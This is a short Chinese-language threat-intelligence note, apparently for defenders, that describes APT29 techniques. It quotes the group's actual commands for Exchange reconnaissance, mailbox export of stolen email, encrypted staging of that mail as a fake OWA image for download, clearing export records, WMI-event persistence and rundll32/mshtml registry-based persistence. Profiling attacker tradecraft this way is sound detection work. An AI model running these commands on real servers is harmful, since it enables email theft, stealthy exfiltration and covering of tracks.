# APT29

## 特征

1. 该组织在Exchange服务器内网侦察时会使用PowerShell命令获取Exchange服务器的用户列表和当前角色.

```powershell
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "Get-ManagementRoleAssignment -GetEffectiveUsers | select Name,Role,EffectiveUserName,AssignmentMethod,IsValid | ConvertTo-Csv -NoTypeInformation | % {$_ -replace '`n','_'} | Out-File C:\temp\1.xml"
```

使用PowerShell命令检查Web服务虚拟目录信息.

```powershell
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "Get-WebServicesVirtualDirectory | Format-List"
```

在窃取电子邮件的文件时也会使用PowerShell命令.

```powershell
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "New-MailboxExportRequest -Mailbox foobar@组织 -ContentFilter {(Received -ge '03/01/2020')} -FilePath '\\<邮箱服务器>\c$\temp\b.pst'"
```

然后该组织会在受害者的OWA服务器上使用7Z压缩程序将文件压缩成加密的压缩包，并通过HTTP请求进行访问，执行完成后，通过访问请求：/owa/auth/Redir.png，即可下载泄露数据.

```powershell
C:\Windows\system32\cmd.exe /C .\7z.exe a -mx9 -r0 -p[密码]  "C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Redir.png" C:\Temp\b.pst
```

在窃取电子邮件结束后，该组织会使用PowerShell命令清除导出邮件记录.

```powershell
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "Get-MailboxExportRequest -Mailbox user@组织 | Remove-MailboxExportRequest -Confirm:$False"
```

2. 在持久化时使用WMI事件进行持久化.

```WMI
SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 180 AND TargetInstance.SystemUpTime < 480
```

3. 利用MSHTA持久化

```cmd
rundll32.exe vbscript:”..\mshtml,RunHTMLApplication “+Execute(CreateObject(“WScript.Shell”).RegRead(“HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\sibot\”))(window.close)
//先读取注册表再创建对象，并使用rundll32.exe运行
```
